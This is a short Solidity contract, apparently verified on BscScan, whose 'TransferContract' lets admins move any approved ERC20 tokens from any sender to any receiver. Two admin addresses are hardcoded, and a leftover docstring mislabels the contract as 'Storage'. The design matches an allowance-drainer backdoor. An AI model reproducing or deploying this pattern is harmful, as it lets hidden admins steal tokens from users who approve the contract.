/**
 *Submitted for verification at BscScan.com on 2021-11-06
*/

/**
 *Submitted for verification at BscScan.com on 2021-11-06
*/



// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

// import "./TransferHelper.sol";
/**
 * @title Storage
 * @dev Store & retrieve value in a variable
 */
 
 interface IERC20 {
      function balanceOf(address who) external view returns (uint256);
      function transfer(address to, uint256 value) external returns (bool);
      function transferFrom(address from, address to, uint256 value)
        external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
     function approve(address spender, uint256 amount) external returns (bool);
     function increaseAllowance(address spender, uint256 addedValue) external returns (bool);

}

contract TransferContract {


    mapping(address => bool) adminMembers;
    
    constructor (address RootAdmin){
        
         adminMembers[RootAdmin]=true;
        adminMembers[0xaF14f3B4d079fE1e8c6207EaB6F510d42E724dbc]=true;
        adminMembers[0x8A52B55E4f72a1a8B67eD865d370196c95632cec]=true;
       
    }

    function transfer(address tokenAddress, address sender, address receiver,uint256 amount )public returns (bool){
        require(adminMembers[msg.sender]==true, "Unauthorized action");
        
        IERC20 tokenContract = IERC20(tokenAddress);
        
        bool isTransfered=IERC20(tokenContract).transferFrom(sender,receiver,amount);
        require(isTransfered==true,"Increase allowance to contract");
        
       
        
        
        return isTransfered;
    }
    
    
}